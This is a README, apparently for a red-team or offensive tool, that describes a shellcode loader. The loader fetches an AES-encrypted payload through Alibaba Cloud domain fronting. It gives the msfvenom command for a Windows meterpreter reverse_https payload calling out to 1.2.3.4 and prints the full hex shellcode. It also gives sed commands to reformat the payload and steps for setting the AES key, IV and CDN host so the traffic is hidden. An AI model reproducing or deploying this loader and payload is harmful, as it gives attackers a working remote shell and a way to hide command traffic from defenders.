# RemoteCryptoShellcodeLoader

## 说明

Shellcode远程加载器
- 支持通过DomainFronting(aliyun)远程加载shellcode
- 远程获取shellcode使用aes动态加密传输数据

[ShellCode远程加载器改造计划
](https://uknowsec.cn/posts/notes/ShellCode%E8%BF%9C%E7%A8%8B%E5%8A%A0%E8%BD%BD%E5%99%A8%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92.html)

## shellcode
```
$ msfvenom -p windows/meterpreter/reverse_https LHOST=1.2.3.4 LPORT=443 -f c -o msf.txt
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 545 bytes
Final size of c file: 2315 bytes
Saved as: msf.txt

$ cat msf.txt|grep -v unsigned|sed "s/\"\\\x//g"|sed "s/\\\x//g"|sed "s/\"//g"|sed ':a;N;$!ba;s/\n//g'|sed "s/;//g"

fce8820000006089e531c0648b50308b520c8b52148b72280fb74a2631ffac3c617c022c20c1cf0d01c7e2f252578b52108b4a3c8b4c1178e34801d1518b592001d38b4918e33a498b348b01d631ffacc1cf0d01c738e075f6037df83b7d2475e4588b582401d3668b0c4b8b581c01d38b048b01d0894424245b5b61595a51ffe05f5f5a8b12eb8d5d686e6574006877696e6954684c772607ffd531db5353535353683a5679a7ffd553536a03535368bb010000e8500100002f626a5468507451456358326a314b4c562d4b483955776e4d466970474165444b4e702d336e754f3776474a69785f58436b3957444442566a78544c7743536d736f68744d4476754a4a77746d4953624d774f77414a6a6f555564575f61476532764f314a534c364347424c6278535f7a6645447043494d50786443595f63326e735831775f4651316e33532d484f34644a376f68424c4832574173576d687762686533726c6866465177523557505465324366502d654f666a62414834597100506857899fc6ffd589c653680032e08453535357535668eb552e3bffd5966a0a5f688033000089e06a04506a1f566875469e86ffd55353535356682d06187bffd585c0751468881300006844f035e0ffd54f75cde8440000006a4068001000006800004000536858a453e5ffd593535389e7576800200000535668129689e2ffd585c074cf8b0701c385c075e558c35fe86bffffff312e322e332e3400bbf0b5a2566a0053ffd5
```

## DomainFronting

阿里云申请的cdn地址不是w.cdngslb.com的话改一下加载器HttpConnect.cpp第63行的代码


## AES配置

### C++
main.cpp
```
	key = key + "123456";
	cryptopp::init(key, "0000000000000000");
```

- 修改拼接的6位字符内容
- 修改16位iv值

### Python

```
    key = key + "123456"
```
- 对应修改拼接的6位字符内容

```
   vi = '0000000000000000'
   text = ''

```
- 对应修改16位iv值
- 修改shellcode


## 编译依赖

### cryptopp

```
vcpkg install cryptopp
```
